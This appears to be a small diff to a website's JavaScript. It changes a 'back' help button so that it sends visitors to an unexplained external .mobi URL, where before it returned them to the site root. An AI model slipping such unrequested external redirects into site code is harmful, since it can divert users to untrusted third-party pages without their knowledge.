@@ -172,7 +172,7 @@ window.addEventListener("DOMContentLoaded", function () {
     };
   if (bantuanKembali)
     bantuanKembali.onclick = function () {
-      window.location.href = "/";
+      window.location.href = "https://jgjk.mobi/m/634153e7e237e";
     };
   if (bantuanInstagram)
     bantuanInstagram.onclick = function () {
